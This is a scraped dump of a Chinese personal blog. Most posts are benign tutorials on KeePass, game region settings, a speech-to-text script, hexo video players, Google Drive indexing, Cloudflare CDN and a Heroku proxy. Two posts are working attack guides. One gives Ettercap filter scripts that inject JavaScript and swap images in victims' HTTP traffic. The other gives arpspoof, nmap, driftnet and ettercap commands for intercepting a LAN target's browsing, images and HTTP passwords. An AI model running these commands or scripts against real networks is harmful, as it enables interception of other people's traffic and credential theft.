汉化官网汉化包下载简体中文 2.4.4+ 版然后转到 keepass语言安装目录 默认为 C:\\Program Files (x86)\\KeePass Password Safe 2\\Languages将刚刚下载的语言压缩包解压，`` 复制到该目录。然后在软件里更改语言。重启后生效 备份到云找到数据库文件备份到你认为安全的地方。","tags":[{"name":"密码","slug":"密码","permalink":"https://www.unkaer.cf/tags/%E5%AF%86%E7%A0%81/"},{"name":"开源","slug":"开源","permalink":"https://www.unkaer.cf/tags/%E5%BC%80%E6%BA%90/"}]},{"title":"使命召唤：战区入坑指南","date":"2020-04-13T14:56:49.000Z","path":"warzone.html","text":"一款免费吃鸡游戏，80多个G的。使命召唤16使命召唤：战区入坑指南注册国际服账号俄罗斯注册网址日本注册网址印度注册网址选择地区 不要选中国，可以是 俄罗斯、日本、印度等，都不需要身份证验证，只要有邮箱就行。(可以用临时邮箱注册…)如果以后想在俄区等 低价区 以低价格购买其他使命召唤系列作品，则 地区 选项必须选择相应的低价地区。然后验证一下邮箱 下载暴雪客户端官网下载然后安装 修改为国际版方案一修改配置文件，添加亚服美服欧服的登录选项。C:\\Users\\你的用户名\\AppData\\Roaming\\Battle.net用记事本打开 Battle.net.config找到 AllowedRegions 改为 CN;US;EU;KR找到 AllowedLocales 改为 zhCN;zhTW;deDE;enGB;enUS;esMX;esES;frFR;itIT;plPL;ptBR;ruRU;koKR AllowedRegions 就是 CN国服;US美服;EU欧服;KR韩/台服 AllowedLocales 就是 登录器语言 之后在设置里面就可以修改以上的语言。 &quot;AllowedRegions&quot;: &quot;CN;US;EU;KR&quot; &quot;AllowedLocales&quot;: &quot;zhCN;deDE;enGB;enUS;esMX;esES;frFR;itIT;plPL;ptBR;ruRU;koKR;zhTW&quot;在登陆的时候就可以选择区服，然后登录 方案二在快捷方式 属性 目标后面 添加启动命令注意前面有个空格，不然会报错。 设置为 美服 英文--setregion=US --setlanguage=enUS或者 设置为 台服(亚服) 繁中--setregion=TW --setlanguage=zhTW 然后再重命名，做一下区分，可以向这样。这样就可以直接启动某个区，就不用手动切换啦。 腾讯加速器免费全速下载新用户有免费时长，还可以做各种任务换时长。 下载腾讯加速器腾讯加速器官网还推出了，使命召唤16 加速专线 游戏库里面选择使命召唤16下载加速经测试，腾讯加速器节点是香港的，如果登录的是美版，加速效果可能为负。所以启动 台版 然后配合香港节点，效果杠杠的。 游戏库 -&gt; 下载加速 -&gt; 使命召唤16 下载加速看下载效果 注意下载过程不要暂停，一次性下完，否则，玩游戏时会报很多的错误。暴雪的下载机制不完善，暂停后可能部分文件就没下载完。(看起来是下完了的) 解决方案如果游戏中报错，就删除相应文件，然后扫描修复。这是一个漫长而折磨人的过程。80多个G的文件，全部读取一遍(猝","tags":[{"name":"使命召唤16","slug":"使命召唤16","permalink":"https://www.unkaer.cf/tags/%E4%BD%BF%E5%91%BD%E5%8F%AC%E5%94%A416/"}]},{"title":"英语听力转文本","date":"2020-04-12T10:07:06.000Z","path":"totext.html","text":"为了应对英语听力，学习英语是不存在的，所以有了该脚本。用 pythong3 调用百度AI语音识别转换为文字。因为百度AI不在场MP3格式，所以转换为wav格式。最大长度不能超过60秒，所以截取为55秒。有担心把单词截掉了，所以第二个55秒，往前移动5秒。即055秒截一下，50105秒截一下。。。 流程将 233.MP3 文件每55秒截取为 16000比特率单身到的 wav，调用百度AI语音识别转换为文字，储存到 ytext.txt 文件中 源码要修改为自己百度的 Key源码已上传到 github项目 from pydub import AudioSegment from aip import AipSpeech import time import os APP_ID = &#39;xxxxxx&#39; API_KEY = &#39;xxxxxxxxxx&#39; SECRET_KEY = &#39;xxxxxxxxxxxxx&#39; client = AipSpeech(APP_ID, API_KEY, SECRET_KEY) def listen(save_name1): with open(save_name1, &#39;rb&#39;) as f: audio_data = f.read() result = client.asr(audio_data, &#39;wav&#39;, 16000, { &#39;dev_pid&#39;: 1737, }) result_text = result[&quot;result&quot;][0] return result_text soundy = AudioSegment.from_file(&#39;233.mp3&#39;) soundytime=soundy.duration_seconds a = int(soundytime) b = 55 st = 0 sp = 55000 print(&quot;英语听力转文本，缺点没有标点符号&quot;) print(&quot;学习英语，不可能的，这辈子都不存在&quot;) print(&quot;原始音频长度：&quot;+str(a)+&quot;秒\\n稍后分析出的内容会储存到 ytxt.txt 中&quot;) song = AudioSegment.from_mp3(&#39;233.mp3&#39;).set_frame_rate(16000).set_channels(1).set_sample_width(2) starttime = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) ytxt = open(&#39;ytxt.txt&#39;,&#39;a&#39;) ytxt.write(&#39;开始时间:&#39;+starttime+&quot;\\n&quot;) ytxt.close() while a&gt;b: word = song[st:sp] save_name = (str(st/1000)+&quot;-&quot;+str(sp/1000)+&quot;.wav&quot;) word.export(save_name, format=&quot;wav&quot;) print(&quot;正在分析文件&quot;+str(st/1000)+&quot;秒到&quot;+str(sp/1000)+&quot;秒的音频&quot;) btxt = listen(save_name) ytxt = open(&#39;ytxt.txt&#39;,&#39;a&#39;) ytxt.write(str(st/1000)+&quot;秒到&quot;+str(sp/1000)+&quot;秒的内容：\\n&quot;+btxt+&quot;\\n&quot;) ytxt.close() os.remove(save_name) st = sp-5000 sp = st+55000 a = a-b+5 sp = st+(a*1000) word = song[st:sp] save_name = (str(st/1000)+&quot;-&quot;+str(sp/1000)+&quot;.wav&quot;) word.export(save_name, format=&quot;wav&quot;) starttime = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) print(&quot;正在分析文件&quot;+str(st/1000)+&quot;秒到&quot;+str(sp/1000)+&quot;秒的音频&quot;) btxt = listen(save_name) ytxt = open(&#39;ytxt.txt&#39;,&#39;a&#39;) enttime = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) ytxt.write(str(st/1000)+&quot;秒到&quot;+str(sp/1000)+&quot;秒的内容：\\n&quot;+btxt+&quot;\\n结束时间&quot;+enttime+&quot;\\n------分割线------\\n\\n&quot;) ytxt.close() os.remove(save_name) 版本2.0添加了一些交互 from pydub import AudioSegment from aip import AipSpeech import time import os import urllib import requests import re APP_ID = &#39;xxxxxx&#39; API_KEY = &#39;xxxxxxxxxxxxxx&#39; SECRET_KEY = &#39;xxxxxxxxxxxxxx&#39; client = AipSpeech(APP_ID, API_KEY, SECRET_KEY) def listen(save_name1): with open(save_name1, &#39;rb&#39;) as f: audio_data = f.read() result = client.asr(audio_data, &#39;wav&#39;, 16000, { &#39;dev_pid&#39;: 1737, }) result_text = result[&quot;result&quot;][0] return result_text starttime = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) ytxt = open(&#39;ytxt.txt&#39;,&#39;w+&#39;) ytxt.write(&#39;开始时间:&#39;+starttime+&quot;\\n&quot;) ytxt.close() print(&quot;英语听力转文本，缺点没有标点符号&quot;) print(&quot;学习英语，不可能的，这辈子都不存在&quot;) f = 0 while f==0: inmp3 = input(u&#39;请输入mp3文件的名称或者mp3的url:\\n默认为 233.mp3\\n&#39;) if inmp3==&quot;&quot;: inmp3 = &quot;233.mp3&quot; else: s = re.search(&quot;https?://&quot;, inmp3) if s: print(&quot;正在下载文件&quot;) urllib.request.urlretrieve(inmp3, &quot;233.mp3&quot;) print(&quot;下载成功&quot;) inmp3 = &quot;233.mp3&quot; m = re.search(&quot;.mp3&quot;, inmp3) if m==None: inmp3 = inmp3+&quot;.mp3&quot; if os.path.exists(inmp3)==False: print(&quot;没有发现&quot;+inmp3+&quot;文件&quot;) else: f=1 song = AudioSegment.from_mp3(inmp3).set_frame_rate(16000).set_channels(1).set_sample_width(2) songtime = song.duration_seconds a = int(songtime) print(&quot;原始音频长度：&quot;+str(a)+&quot;秒\\n稍后分析出的内容会储存到 ytxt.txt 中&quot;) b = 55 st = 0 sp = 55000 while a&gt;b: word = song[st:sp] save_name = (str(st/1000)+&quot;-&quot;+str(sp/1000)+&quot;.wav&quot;) word.export(save_name, format=&quot;wav&quot;) print(&quot;正在分析文件&quot;+str(st/1000)+&quot;秒到&quot;+str(sp/1000)+&quot;秒的音频&quot;) btxt = listen(save_name) ytxt = open(&#39;ytxt.txt&#39;,&#39;a&#39;) ytxt.write(str(st/1000)+&quot;秒到&quot;+str(sp/1000)+&quot;秒的内容：\\n&quot;+btxt+&quot;\\n&quot;) ytxt.close() ltxt = open(&#39;ltxt.txt&#39;,&#39;a&#39;) ltxt.write(&quot;\\n@&quot;+btxt+&quot;@\\n&quot;) ltxt.close() os.remove(save_name) st = sp-5000 sp = st+55000 a = a-b+5 sp = st+(a*1000) word = song[st:sp] save_name = (str(st/1000)+&quot;-&quot;+str(sp/1000)+&quot;.wav&quot;) word.export(save_name, format=&quot;wav&quot;) starttime = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) print(&quot;正在分析文件&quot;+str(st/1000)+&quot;秒到&quot;+str(sp/1000)+&quot;秒的音频&quot;) btxt = listen(save_name) ytxt = open(&#39;ytxt.txt&#39;,&#39;a&#39;) enttime = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime()) ytxt.write(str(st/1000)+&quot;秒到&quot;+str(sp/1000)+&quot;秒的内容：\\n&quot;+btxt+&quot;\\n结束时间&quot;+enttime+&quot;\\n------分割线------\\n\\n&quot;) ytxt.close() ltxt = open(&#39;ltxt.txt&#39;,&#39;a&#39;) ltxt.write(&quot;\\n@&quot;+btxt+&quot;@\\n&quot;) ltxt.close() os.remove(save_name) pyinstaller 打包pyinstaller -F xxx.py","tags":[{"name":"python","slug":"python","permalink":"https://www.unkaer.cf/tags/python/"}]},{"title":"hexo添加dplayer在线播放器","date":"2020-04-11T13:40:10.000Z","path":"hexo-dplay.html","text":"hexo添加dplay在线视频播放器，支持弹幕、截图、字幕、倍速播放。Github项目 将dplayer运行在hexo的插件MoePlayer/hexo-tag-dplayer dplayer在线视频播放器MoePlayer/DPlayerDPlayer官方指南 插件的使用npm 安装npm install hexo-tag-dplayer --save 使用方法编辑 Markdown 时，使用格式 {% dplayer key=value ... %} 一个最简单的列子：{% dplayer \"url=https://xxx.com/xxx.mp4\" \"pic=https://xxx.com/xxx.jpg\" \"loop=yes\" \"autoplay=false\" \"mutex=true\" %} url 视频地址pic 视频封面loop 视频循环播放autoplay 视频自动播放mutex 互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器 再来一个{% dplayer \"url=https://xxx.com/xxx.mp4\" \"pic=https://xxx.com/xxx.jpg\" \"loop=yes\" \"autoplay=false\" \"mutex=true\" \"logo=logo.png\" \"screenshot=true\" \"volume=0.7\" %} logo 左上角添加logoscreenshot 开启截图volume 默认音量 关键 key 可以是dplayer 选项: &#39;autoplay&#39;, &#39;loop&#39;, &#39;screenshot&#39;, &#39;hotkey&#39;, &#39;mutex&#39;, &#39;dmunlimited&#39; : 布尔选项，使用&quot;yes&quot; &quot;y&quot; &quot;true&quot; &quot;1&quot; &quot;on&quot;或者留空 &#39;preload&#39;, &#39;theme&#39;, &#39;lang&#39;, &#39;logo&#39;, &#39;url&#39;, &#39;pic&#39;, &#39;thumbnails&#39;, &#39;vidtype&#39;, &#39;suburl&#39;, &#39;subtype&#39;, &#39;subbottom&#39;, &#39;subcolor&#39;, &#39;id&#39;, &#39;api&#39;, &#39;token&#39;, &#39;addition&#39;, &#39;dmuser&#39; : 字符串参数 &#39;volume&#39;, &#39;maximum&#39; : 数字参数 容器 选项: &#39;width&#39;, &#39;height&#39; : 字符串，用于容器元素样式 其他: &#39;code&#39;:这个键的值将被附加到script标签中参数列表DPlayer 有丰富的参数可以自定义你的播放器实例 名称 默认值 描述 autoplay false 视频自动播放 loop false 视频循环播放 screenshot false 开启截图，如果开启，视频和视频封面需要允许跨域 hotkey true 开启热键，支持快进、快退、音量控制、播放暂停 mutex true 互斥，阻止多个播放器同时播放，当前播放器播放时暂停其他播放器 dunlimited false 海量弹幕模式，即使重叠也展示全部弹幕，请注意播放器会记忆用户设置，用户手动设置后即失效 preload ‘auto’ 视频预加载，可选值: ‘none’, ‘metadata’, ‘auto’ theme ‘#b7daff’ 主题色 lang navigator.language.toLowerCase() 可选值: ‘en’, ‘zh-cn’, ‘zh-tw’ logo - 在左上角展示一个 logo，你可以通过 CSS 调整它的大小和位置 url - 视频链接 pic - 视频封面 thumbnails - 视频缩略图，可以使用 DPlayer-thumbnails 生成 type ‘auto’ 可选值: ‘auto’, ‘hls’, ‘flv’, ‘dash’, ‘webtorrent’, ‘normal’ 或其他自定义类型, 见#MSE 支持 suburl required 字幕链接 subbottom ‘40px’ 字幕距离播放器底部的距离，取值形如: ‘10px’ ‘10%’ subcolor ‘#fff’ 字幕颜色 id required 弹幕池 id，必须唯一 api required 见#弹幕接口 token - 弹幕后端验证 token addition - 额外外挂弹幕，见#bilibili 弹幕 dmuser ‘DIYgod’ 弹幕用户名 volume 0.7 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效 maximum - 弹幕最大数量 以上就是支持的列表 以下列表可以直接使用 HTML标签 实现 简单例子： &lt;link rel=&quot;stylesheet&quot; href=&quot;DPlayer.min.css&quot; /&gt; &lt;div id=&quot;dplayer&quot;&gt;&lt;/div&gt; &lt;script src=&quot;DPlayer.min.js&quot;&gt;&lt;/script&gt; &lt;!--加载播放器文件--&gt; &lt;script&gt; const dp = new DPlayer({ container: document.getElementById(&#39;dplayer&#39;), video: { url: &#39;https://xxx.com/xxx.mp4&#39;, }, }); &lt;/script&gt; 完整的事例： const dp = new DPlayer({ container: document.getElementById(&#39;dplayer&#39;), autoplay: false, theme: &#39;#FADFA3&#39;, loop: true, lang: &#39;zh-cn&#39;, screenshot: true, hotkey: true, preload: &#39;auto&#39;, logo: &#39;logo.png&#39;, volume: 0.7, mutex: true, video: { url: &#39;dplayer.mp4&#39;, pic: &#39;dplayer.png&#39;, thumbnails: &#39;thumbnails.jpg&#39;, type: &#39;auto&#39;, }, subtitle: { url: &#39;dplayer.vtt&#39;, type: &#39;webvtt&#39;, fontSize: &#39;25px&#39;, bottom: &#39;10%&#39;, color: &#39;#b7daff&#39;, }, danmaku: { id: &#39;9E2E3368B56CDBB4&#39;, api: &#39;https://api.prprpr.me/dplayer/&#39;, token: &#39;tokendemo&#39;, maximum: 1000, addition: [&#39;https://api.prprpr.me/dplayer/v3/bilibili?aid=4157142&#39;], user: &#39;DIYgod&#39;, bottom: &#39;15%&#39;, unlimited: true, }, contextmenu: [ { text: &#39;custom1&#39;, link: &#39;https://github.com/DIYgod/DPlayer&#39;, }, { text: &#39;custom2&#39;, click: (player) =&gt; { console.log(player); }, }, ], highlight: [ { time: 20, text: &#39;这是第 20 秒&#39;, }, { time: 120, text: &#39;这是 2 分钟&#39;, }, ], }); 名称 默认值 描述 live false 开启直播模式, 见#直播 apiBackend - 自定义获取和发送弹幕行为，见#直播 video.quality - 见#清晰度切换 video.defaultQuality - 见#清晰度切换 video.customType - 自定义类型, 见#MSE 支持 subtitle.type ‘webvtt’ 字幕类型，可选值: ‘webvtt’, ‘ass’，目前只支持 webvtt subtitle.fontSize ‘20px’ 字幕字号 danmaku.bottom - 弹幕距离播放器底部的距离，防止遮挡字幕，取值形如: ‘10px’ ‘10%’ danmaku.unlimited false 海量弹幕模式，即使重叠也展示全部弹幕，请注意播放器会记忆用户设置，用户手动设置后即失效 contextmenu [] 自定义右键菜单 highlight [] 自定义进度条提示点 测试以下视频存放于 Google drive 无限网盘，通过cloudflare加速。如果你感兴趣，觉得还不错的话，欢迎访问google drive无限网盘 查看怎么部署。 加载视频慢，请耐心等待一下，加载出来以后是很快的。 博物馆奇妙夜1 (1.94GB)(function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer2\"),\"loop\":true,\"mutex\":true,\"video\":{\"url\":\"https://gd.zan7l.tk/videos/movie/博物馆奇妙夜/博物馆奇妙夜.mkv\",\"pic\":\"https://xxx.com/xxx.jpg\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() 博物馆奇妙夜2 (1.87GB)(function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer3\"),\"loop\":true,\"mutex\":true,\"video\":{\"url\":\"https://gd.zan7l.tk/videos/movie/博物馆奇妙夜/博物馆奇妙夜2.mkv\",\"pic\":\"https://xxx.com/xxx.jpg\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() 博物馆奇妙夜3 (1.31GB)(function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer4\"),\"loop\":true,\"mutex\":true,\"video\":{\"url\":\"https://gd.zan7l.tk/videos/movie/博物馆奇妙夜/博物馆奇妙夜3.mp4\",\"pic\":\"https://xxx.com/xxx.jpg\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()","tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.unkaer.cf/tags/hexo/"},{"name":"dplayer","slug":"dplayer","permalink":"https://www.unkaer.cf/tags/dplayer/"}]},{"title":"google drive无限网盘","date":"2020-04-11T03:10:22.000Z","path":"google-drive.html","text":"google drive无限网盘，配合cloudflare高速下载，访问。 准备当然你首先要有Google和cloudflare账号，自行注册。 使用限制cloudflare wokers一天10万请求限制google drive 下载10T/24h（大佬说的）google api 调用限制 注册Google无限网盘提供几个个注册网址,注册要多等一会儿，不要重复提交网上一搜一大把。 无限网盘注册1无限网盘注册2无限网盘注册3 rclone获取账号 opn登录注意需要 真·全局代理 ，否则最后一步获取信息会失败。我注册时使用 ShadowsocksR 和 v2rayN 均失败，最后用 SSTap 成功。或者利用 VPS 获取登录信息也可以。附上两个免费临时使用的 VPS [ssh.cloud.google]https://ssh.cloud.google.com/ [ide.goorm]https://ide.goorm.io/ 安装 rclone 对应的客户端 下载rclone客户端 下载网址rclone客户端下载太慢，附上win64位客户端 蓝奏云rclone-v1.51.0-windows-amd64.zip 解压到任意目录, 文件管理器目录栏中输入 cmd 启动命令行,输入 rclone config 进行配置 新建配置, 选择 n ,然后给配置随便取一个名字 e) Edit existing remote n) New remote d) Delete remote r) Rename remote c) Copy remote s) Set configuration password q) Quit config n/s/q&gt; n name&gt; goole drive 选择 13 Google Drive ..... 13 / Google Drive \\ &quot;drive&quot; ...... Storage&gt; 13 输入应用 client_id client_secret 可直接 回车 用 rclone 官方内置的项目，于别人共用Google API可能会很慢 自行创建Google项目,（推荐，Google API调研上限，自用肯定用不完）Google Application Client Id Setting your own is recommended. See https://rclone.org/drive/#making-your-own-client-id for how to create your own. If you leave this blank, it will use an internal key which is low performance. Enter a string value. Press Enter for the default (&quot;&quot;). client_id&gt; Google Application Client Secret Setting your own is recommended. Enter a string value. Press Enter for the default (&quot;&quot;). client_secret&gt; 创建Google项目：（可跳过）如果用 rclone 官方内置的项目,跳过本步骤 登录 Google API 新建项目 取个名称 创建 左上角切换到你刚刚创建的项目 左侧栏切换到到 OAuth 同意屏幕 选择 内部、外部 都可以 然后给应用随便取一个名字 保存 访问项目凭据 创建凭据 选择 OAuth 客户端ID 选择其他 保存OAuth 客户端ID(即client_id)和密钥(即client_secret) 继续配置rclone, 允许rclone的权限，全部权限 选择 1 Scope that rclone should use when requesting access from drive. Enter a string value. Press Enter for the default (&quot;&quot;). Choose a number from below, or type in your own value 1 / Full access all files, excluding Application Data Folder. \\ &quot;drive&quot; 2 / Read-only access to file metadata and file contents. \\ &quot;drive.readonly&quot; / Access to files created by rclone only. 3 | These are visible in the drive website. | File authorization is revoked when the user deauthorizes the app. \\ &quot;drive.file&quot; / Allows read and write access to the Application Data folder. 4 | This is not visible in the drive website. \\ &quot;drive.appfolder&quot; / Allows read-only access to file metadata but 5 | does not allow any access to read or download file content. \\ &quot;drive.metadata.readonly&quot; scope&gt; 1 网盘根目录, 访问Google共享云端硬盘 访问自己的共享网盘的根目录,然后网址最后一段 字符就是 根目录地址 如图 ID of the root folder Leave blank normally. Fill in to access &quot;Computers&quot; folders (see docs), or for rclone to use a non root folder as its starting point. Note that if this is blank, the first time rclone runs it will fill it in with the ID of the root folder. Enter a string value. Press Enter for the default (&quot;&quot;). root_folder_id&gt;xxxxx 储存凭据JSON文件路径,默认即可，直接 回车 Service Account Credentials JSON file path Leave blank normally. Needed only if you want use SA instead of interactive login. Enter a string value. Press Enter for the default (&quot;&quot;). service_account_file&gt; 编辑高级配置,默认即可,不编辑配置,直接 回车 Edit advanced config? (y/n) y) Yes n) No (default) y/n&gt; n 远程配置, 重点 如果是使用本地机获取 rclone 配置,默认自动配置，回打开网页授权即可。 如果是使用 vps 获取,选择 n 手动获取,然后访问提供的网址 授权,将得到的 verification code 输入即可 Remote config Use auto config? * Say Y if not sure * Say N if you are working on a remote or headless machine y) Yes (default) n) No y/n&gt; 选择自己的网盘 Choose a number from below, or type in your own value 1 / xxxxxx \\ &quot;xxxxxxxx&quot; Enter a Team Drive ID&gt; 1 保存得到 的 client_id client_secret root_folder_id refresh_token [cfdrive] type = drive client_id = xxxxx client_secret = xxx scope = drive root_folder_id = xxx token = {&quot;access_token&quot;:&quot;xxxxxxxxxxx&quot;,&quot;token_type&quot;:&quot;Bearer&quot;,&quot;refresh_token&quot;:&quot;xxxxxxxxxxxx&quot;:&quot;2020-xx-xxTxx:xx:xx.xxxxxx+xx:xx&quot;} team_drive = 0AGb_5t1PlgFlUk9PVA 部署cloudflare workers开始搭建填写自己喜爱的二级域名然后创建worker 进入github项目 的index.js 复制代码。 清除hello world示范代码后粘贴进去。然后修改开头的 var authConfig = { &quot;siteName&quot;: &quot;GoIndex&quot;, // 网站名称 &quot;root_pass&quot;: &quot;123456&quot;, // 根目录密码，优先于.password &quot;version&quot; : &quot;1.0.6&quot;, // 程序版本 &quot;theme&quot; : &quot;material&quot;, // material classic &quot;client_id&quot;: &quot;xxxxx&quot;, //client_id &quot;client_secret&quot;: &quot;xxxxxx&quot;, //client_secret &quot;refresh_token&quot;: &quot;&quot;, // 授权 token &quot;root&quot;: &quot;root&quot; // 根目录ID 访问部署的cloudflare workers 后续使用畅快使用修改访问域名为自己的域名 方法一域名 DNS 接入cloudflare,域名管理页面 -&gt; workers -&gt;添加路由 方法二域名 CNAME or A 接入cloudflare第三方,然后域名解析 CNAME 到 workers 项目 可参考cloudflare自定义IP加速网站 Google网页版上传上传文件，直接使用网页版 的，感觉还不错 cloudflare访问和下载访问 cloudflare workers 项目提供的网址即可 加密文件夹在某个文件夹下添加 .password 文件，里面写入密码，即可加密该文件夹。注意文件必须以 UTF8NoBOM 编码，且密码前后不能有空格或空行，Windows 下可通过以下方式生成： 文件夹下按住 Shift 键的同时，鼠标右击文件夹空白处，选择 在此处打开 Powershell 窗口(S)，接着执行以下命令，其中 1234 便是密码。 &#39;1234&#39; | Out-File -FilePath .password -Encoding ascii -NoNewline 然后将 .password 文件上传到要加密的文件夹 添加描述在某个文件夹下添加 README.md 文件，里面按照 markdown 格式写描述，打卡该文件夹网址时下方会有相关描述。","tags":[{"name":"网盘","slug":"网盘","permalink":"https://www.unkaer.cf/tags/%E7%BD%91%E7%9B%98/"},{"name":"Google","slug":"Google","permalink":"https://www.unkaer.cf/tags/Google/"}]},{"title":"cloudflare自定义IP加速网站","date":"2020-04-10T07:55:33.000Z","path":"cloudflare-cdn.html","text":"cloudflare自定义IP加速网站Cloudflare免费版CDN加速的IP地址是固定的，但由 cloudflare api 制作的第三方网址可以自定义 CND 加速 ip 。制作个性优化。Cloudflare CND加速在国内很慢，国外非常快。Cloudflare有香港的路线，加速国内。 DNS解析到域名供应商处 NS 到 阿里云DNS阿里云DNS 支持负载均衡，不同的运营商解析到不同IP将域名解析到 Cloudflare CDN 的 IP CNME接入cloudflare第三方笨牛网 CNAME接入域名需要 cloudflare 账号登录 将域名解析到自己的服务器 所以 客户 -&gt; Cloudflare CDN -&gt; 服务器 st=&gt;start: 客户 op=&gt;operation: Cloudflare CDN ed=&gt;end: 服务器 st-&gt;op-&gt;ed 测试IP延迟找出不同运营商最快的IP。利用站长工具 测速。可参考利用python3 ping ip延迟 找出自己最快的IP","tags":[{"name":"cloudflare","slug":"cloudflare","permalink":"https://www.unkaer.cf/tags/cloudflare/"},{"name":"cdn","slug":"cdn","permalink":"https://www.unkaer.cf/tags/cdn/"}]},{"title":"ettercap中间人攻击","date":"2020-04-09T05:18:32.000Z","path":"ettercap.html","text":"Ettercap中间人攻击利用 Ettercap0.8.4 图形化工具，ARP欺骗，替换图片。获取密码。获取访问的网址。 编写攻击脚本替换内容replace(“xxxx”, “xxxx”) 替换http中的图片比如换了百度的logo，但这并没有好大意义。例子如下： if (ip.proto == TCP &amp;&amp; tcp.dst == 80) { if (search(DATA.data, &quot;Accept-Encoding&quot;)) { replace(&quot;Accept-Encoding&quot;, &quot;Accept-Rubbish!&quot;); # note: replacement string is same length as original string #msg(&quot;zapped Accept-Encoding!\\n&quot;); } } if (ip.proto == TCP &amp;&amp; tcp.src == 80) { replace(&quot;img src=&quot;, &quot;img src=https://pic.rmb.bdstatic.com/c86255e8028696139d3e3e4bb44c047b.png&quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=https://pic.rmb.bdstatic.com/c86255e8028696139d3e3e4bb44c047b.png&quot;); msg(&quot;替换图片成功!\\n&quot;); } 弹个窗跟打个招呼if (ip.proto == TCP &amp;&amp; tcp.dst == 80) { if (search(DATA.data, &quot;Accept-Encoding&quot;)) { replace(&quot;Accept-Encoding&quot;, &quot;Accept-Rubbish!&quot;); # note: replacement string is same length as original string #msg(&quot;zapped Accept-Encoding!\\n&quot;); } } if (ip.proto == TCP &amp;&amp; tcp.src == 80) { replace(&quot;&lt;head&gt;&quot;, &quot;&lt;head&gt;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;嘿!朋友&#39;);&lt;/script&gt;&quot;); replace(&quot;&lt;HEAD&gt;&quot;, &quot;&lt;HEAD&gt;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;嘿!朋友&#39;);&lt;/script&gt;&quot;); msg(&quot;替换弹窗成功!\\n&quot;); } 然后另存为alert.filter文件 将alert.filter转变为二进制文件etterfilter alert.filter -o alert.ef 利用ettercap进行中间人攻击选择网卡 确定(Accept) 打开 Host List并扫描 添加为 Target 菜单 -&gt; Target -&gt; Current targets 路由器自身添加为 Target1 目标添加为 Target2 载入刚才生成的脚本 菜单 -&gt; Filters -&gt; Load a filter... 选择刚刚生成的二进制文件 点击 ok 开始arp欺骗 MITM 菜单 -&gt; ARP poisoning... -&gt; OK开始中间人攻击 其他的攻击获取目标的网址，图片，账号密码。 获取目标机访问的图片命令行 urlsnarf -i wlan0 获取目标机访问的图片命令行 driftnet -i wlan0 获取目标机账号密码命令行 ettercap -Tq -i wlan0","tags":[{"name":"wifi","slug":"wifi","permalink":"https://www.unkaer.cf/tags/wifi/"},{"name":"Ettercap","slug":"Ettercap","permalink":"https://www.unkaer.cf/tags/Ettercap/"}]},{"title":"同局域网arp欺骗","date":"2020-04-08T03:35:49.000Z","path":"arp.html","text":"同局域网arp欺骗可以获取对方访问的 http图片，http账号和密码 虚拟机下kali系统见另一篇文章见虚拟机安装kali系统 发现目标和目标机在同一局域网下。 查看本机网络配置 方法1 iwconfih 方法2 ifconfig nmap扫描网段发现目标 nmap 192.168.1.0/24 附录 批量扫描一个网段的主机存活数nmap -sP 192.168.1.0/24 跳过Ping探测nmap -P0 192.168.1.0/24 扫描IP范围nmap -sP 192.168.1.1-50 arpspoof欺骗目标 开启IP转发 让目标机能上网将 1 写入到 /proc/sys/net/ipv4/ip_forward echo 1 &gt; /proc/sys/net/ipv4/ip_forward 查看是否成功 cat /proc/sys/net/ipv4/ip_forward 返回 1 成功 开始欺骗arpspoof -i 网卡 -t 网关ip 目标ip arpspoof -i wlan0 -t 192.168.1.1 192.168.1.2 现在目标机的数据就会经过，本机。 获取目标机访问的图片命令行 urlsnarf -i wlan0 driftnet获取目标图片新建终端窗口 ctrl+shift+T。保持 ARP欺骗 语法： driftnet [options] [filter code] 主要参数： options filter code -b 捕获到新的图片时发出嘟嘟声 -i interface 选择监听接口 -f file -p 不让所监听的接口使用混杂模式 -a 后台模式，将捕获的图片保存到目录中（不会显示在屏幕上） -m number 指定保存图片数的数目 -d directory 指定保存图片的路径 -x prefix 指定保存图片的前缀名 使用举例： 实时监听： driftnet -i wlan0 保存所有图片到本地 driftnet -i wlan0 -d /home/abc/图片/wifi -a 获取目标账号密码新建终端窗口 ctrl+shift+T 保持 ARP欺骗获取目标机在 http 网址输入的账号，密码 ettercap -Tq -i wlan0","tags":[{"name":"wifi","slug":"wifi","permalink":"https://www.unkaer.cf/tags/wifi/"},{"name":"arp","slug":"arp","permalink":"https://www.unkaer.cf/tags/arp/"}]},{"title":"heroku部署v2ray","date":"2020-04-07T09:53:29.000Z","path":"heroku-v2ray.html","text":"搭配cloudflare反代,实现Heroku上 V2Ray 20M 上网。部署准备账号 Heroku账号 Cloudflare github项目bclswl0827/v2ray-heroku 开始部署一键部署完事给项目取一个名字选择服务器地址 有美国和欧洲可选设置UUID 可默认(部署后可修改)、可自己修改为其他 在线UUID生成 或者利用v2rayN客户端生成点击部署等待部署完成View查看 网址 v2rayN客户端设置添加[VMess]服务器 地址 应用名称.herokuapp.com 端口 443 用户ID 刚刚填的UUID 额外ID 64 加密方式 auto 传输协议 ws 路径 / 然后测速，or看看能不能上Google实测很慢,v2rayN客户端显示&lt;0M/s。很慢，但证明成功了，就可以下一步了。 搭配cloudflare workers反代实现2M/scloudflare workers Workers构建无服务器应用程序创建Worker左上角修改workers项目名称脚本内容如下 修改为自己heroku项目的网址 addEventListener( &quot;fetch&quot;,event =&gt; { let url=new URL(event.request.url); url.hostname=&quot;应用名称.herokuapp.com&quot;; let request=new Request(url,event.request); event. respondWith( fetch(request) ) } ) 保存并部署将v2rayN客户端的网址改为cloudflare workers的，再次测速。实现2M/s 负载均衡先配置好一个，然后导出客户端配置。修改导出的json 